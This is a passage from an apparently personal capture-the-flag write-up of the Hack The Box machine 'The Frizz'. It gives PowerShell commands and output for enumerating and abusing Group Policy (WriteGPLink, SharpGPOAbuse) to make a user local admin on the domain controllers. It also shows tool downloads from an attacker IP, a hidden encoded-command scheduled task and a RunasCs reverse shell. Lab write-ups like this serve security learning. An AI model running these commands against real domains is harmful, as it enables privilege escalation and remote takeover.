+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">whoami</span> <span class="p">/</span><span class="n">Groups</span>
+</pre></div>
+</div>
+<p>I’m getting pre-compiled version of SharpGPOAbuse from SharpCollection</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://labs.withsecure.com/publications/ou-having-a-laugh">https://labs.withsecure.com/publications/ou-having-a-laugh</a></p></li>
+<li><p><a class="reference external" href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Flangvik/SharpCollection">https://github.com/Flangvik/SharpCollection</a></p></li>
+</ul>
+</section>
+<section id="tangent-with-a-bunch-of-commands">
+<h2>Tangent with a bunch of commands<a class="headerlink" href="#tangent-with-a-bunch-of-commands" title="Permalink to this heading">#</a></h2>
+<p>The following bunch was not necessarilly successfull, but still worth keeping as notes</p>
+<p>Download and load powerview</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="s2">&quot;http://10.10.16.71:9090/PowerView.ps1&quot;</span> <span class="n">-OutFile</span> <span class="p">./</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+<span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-nop</span> <span class="n">-exec</span> <span class="n">bypass</span>
+<span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+</pre></div>
+</div>
+<p>Get GPOs</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-NetGPO</span> <span class="p">|</span> <span class="p">%{</span><span class="nb">Get-ObjectAcl</span> <span class="n">-ResolveGUIDs</span> <span class="n">-Name</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span><span class="p">}</span>
+<span class="nb">Get-NetGPO</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
+<span class="nb">Get-GPO</span> <span class="n">-Name</span> <span class="s2">&quot;Default Domain Policy&quot;</span>
+<span class="nb">Get-GPO</span> <span class="n">-Name</span> <span class="s2">&quot;Default Domain Controllers Policy&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-GPPermission</span> <span class="p">`</span>
+  <span class="n">-Guid</span> <span class="n">31b2f340</span><span class="p">-</span><span class="n">016d</span><span class="p">-</span><span class="n">11d2</span><span class="p">-</span><span class="n">945f</span><span class="p">-</span><span class="n">00c04fb984f9</span> <span class="p">`</span>
+  <span class="n">-TargetType</span> <span class="n">User</span> <span class="p">`</span>
+  <span class="n">-TargetName</span> <span class="n">m</span><span class="p">.</span><span class="n">schoolbus</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">view</span> <span class="p">\\</span><span class="n">frizz</span><span class="p">.</span><span class="n">htb</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="s2">&quot;http://10.10.16.71:9090/SharpGPOAbuse.exe&quot;</span> <span class="n">-OutFile</span> <span class="p">./</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddLocalAdmin</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="s1">&#39;m.schoolbus&#39;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;Default Domain Controllers Policy&quot;</span>
+<span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddLocalAdmin</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="s1">&#39;m.schoolbus&#39;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;Default Domain Policy&quot;</span>
+<span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddLocalAdmin</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="s1">&#39;m.schoolbus&#39;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;asdf&quot;</span>
+<span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddLocalAdmin</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="s1">&#39;m.schoolbus&#39;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;100&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddUserRights</span> <span class="p">-</span><span class="n">-UserRights</span> <span class="s2">&quot;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight&quot;</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="s1">&#39;m.schoolbus&#39;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;Default Domain Controllers Policy&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Add-LocalAdmin</span> <span class="n">-Identity</span> <span class="s1">&#39;m.schoolbus&#39;</span> <span class="n">-GPOIdentity</span> <span class="s2">&quot;Default Domain Controllers Policy&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-GPOImmediateTask</span> <span class="n">-TaskName</span> <span class="n">Debugging</span> <span class="n">-GPODisplayName</span> <span class="n">VulnGPO</span> <span class="n">-CommandArguments</span> <span class="s1">&#39;-NoP -NonI -W Hidden -Enc AAAAAAA...&#39;</span> <span class="n">-Force</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;Default Domain Controllers Policy&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span>  <span class="nb">Where-Object</span> <span class="p">{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span> <span class="o">-match</span> <span class="s2">&quot;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner&quot;</span><span class="p">)}</span>
+</pre></div>
+</div>
+</section>
+<section id="successfully-abuse-writegplink">
+<h2>Successfully abuse WriteGPLink<a class="headerlink" href="#successfully-abuse-writegplink" title="Permalink to this heading">#</a></h2>
+<p>Create a new GPO with built in powershell commands</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-GPO</span> <span class="n">-Name</span> <span class="s2">&quot;blnkn&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">DisplayName</span>      <span class="p">:</span> <span class="n">blnkn</span>
+<span class="n">DomainName</span>       <span class="p">:</span> <span class="n">frizz</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">Owner</span>            <span class="p">:</span> <span class="n">frizz</span>\<span class="n">M</span><span class="o">.</span><span class="n">SchoolBus</span>
+<span class="n">Id</span>               <span class="p">:</span> <span class="mi">1</span><span class="n">c8a7cdb</span><span class="o">-</span><span class="n">a68a</span><span class="o">-</span><span class="mf">45e5</span><span class="o">-</span><span class="mi">8</span><span class="n">eef</span><span class="o">-</span><span class="n">e1b9257c7f27</span>
+<span class="n">GpoStatus</span>        <span class="p">:</span> <span class="n">AllSettingsEnabled</span>
+<span class="n">Description</span>      <span class="p">:</span>
+<span class="n">CreationTime</span>     <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">12</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>
+<span class="n">ModificationTime</span> <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">12</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>
+<span class="n">UserVersion</span>      <span class="p">:</span>
+<span class="n">ComputerVersion</span>  <span class="p">:</span>
+<span class="n">WmiFilter</span>        <span class="p">:</span>
+</pre></div>
+</div>
+<p>Add a GPLink to the domain controllers OU</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-GPLink</span> <span class="n">-Name</span> <span class="s2">&quot;blnkn&quot;</span> <span class="n">-Target</span> <span class="s2">&quot;OU=Domain Controllers,DC=frizz,DC=htb&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GpoId</span>       <span class="p">:</span> <span class="mi">1</span><span class="n">c8a7cdb</span><span class="o">-</span><span class="n">a68a</span><span class="o">-</span><span class="mf">45e5</span><span class="o">-</span><span class="mi">8</span><span class="n">eef</span><span class="o">-</span><span class="n">e1b9257c7f27</span>
+<span class="n">DisplayName</span> <span class="p">:</span> <span class="n">blnkn</span>
+<span class="n">Enabled</span>     <span class="p">:</span> <span class="kc">True</span>
+<span class="n">Enforced</span>    <span class="p">:</span> <span class="kc">False</span>
+<span class="n">Target</span>      <span class="p">:</span> <span class="n">OU</span><span class="o">=</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">frizz</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+<span class="n">Order</span>       <span class="p">:</span> <span class="mi">2</span>
+</pre></div>
+</div>
+<p>Get SharpGPOAbuse.exe on the box</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="s2">&quot;http://10.10.16.71:9090/SharpGPOAbuse.exe&quot;</span> <span class="n">-OutFile</span> <span class="p">./</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>Add m.schoolbus to localadmin group</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddLocalAdmin</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="n">m</span><span class="p">.</span><span class="n">schoolbus</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="n">blnkn</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[+] Domain = frizz.htb
+[+] Domain Controller = frizzdc.frizz.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
+[+] SID Value of m.schoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
+[+] GUID of &quot;blnkn&quot; is: {1C8A7CDB-A68A-45E5-8EEF-E1B9257C7F27}
+[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{1C8A7CDB-A68A-45E5-8EEF-E1B9257C7F27}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+PS C:\ProgramData&gt; gpupdate /force
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+</pre></div>
+</div>
+<p>Force a group policy update</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">gpupdate</span> <span class="p">/</span><span class="n">force</span>
+</pre></div>
+</div>
+<p>No that m.schoolbus is local admin Get Runas CSharp on the box</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="s2">&quot;http://10.10.16.71:9090/RunasCs.exe&quot;</span> <span class="n">-OutFile</span> <span class="p">./</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>Use it to send a revese shell back to our machine as</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;m.schoolbus&quot;</span> <span class="s1">&#39;!sub**********&#39;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">71</span><span class="p">:</span><span class="n">4242</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../updown/updown.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Updown</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../shared/shared.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Shared</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">The Frizz</a><ul>
+<li><a class="reference internal" href="#initial-enumeration">Initial Enumeration</a></li>
+<li><a class="reference internal" href="#dns-enum">DNS Enum</a></li>
+<li><a class="reference internal" href="#smb-enum">SMB Enum</a></li>
+<li><a class="reference internal" href="#kerberos-user-enum">Kerberos User Enum</a></li>
+<li><a class="reference internal" href="#ssh-enum">SSH Enum</a></li>
+<li><a class="reference internal" href="#apache-web-server">Apache Web Server</a></li>
+<li><a class="reference internal" href="#those-are-the-cves-i-played-with">Those are the CVEs I played with</a></li>
+<li><a class="reference internal" href="#cve-2023-45881-xss-unsuccessfull">CVE-2023-45881 - XSS (Unsuccessfull)</a></li>
+<li><a class="reference internal" href="#cve-2023-45878-arbitrary-file-write">CVE-2023-45878 - Arbitrary File Write</a></li>
+<li><a class="reference internal" href="#database-credentials-exposure">Database credentials exposure</a></li>
+<li><a class="reference internal" href="#pivot-with-chisel">Pivot with Chisel</a></li>
+<li><a class="reference internal" href="#crack-salted-sha256">Crack salted sha256</a></li>
+<li><a class="reference internal" href="#ssh-with-kerberos">SSH with Kerberos</a></li>
+<li><a class="reference internal" href="#bloodhound">BloodHound</a></li>
+<li><a class="reference internal" href="#credential-exposure">Credential exposure</a></li>
+<li><a class="reference internal" href="#tgt-as-m-schoolbus">TGT as m.schoolbus</a></li>
+<li><a class="reference internal" href="#abuse-writegplink">Abuse WriteGPLink</a></li>
+<li><a class="reference internal" href="#tangent-with-a-bunch-of-commands">Tangent with a bunch of commands</a></li>
+<li><a class="reference internal" href="#successfully-abuse-writegplink">Successfully abuse WriteGPLink</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
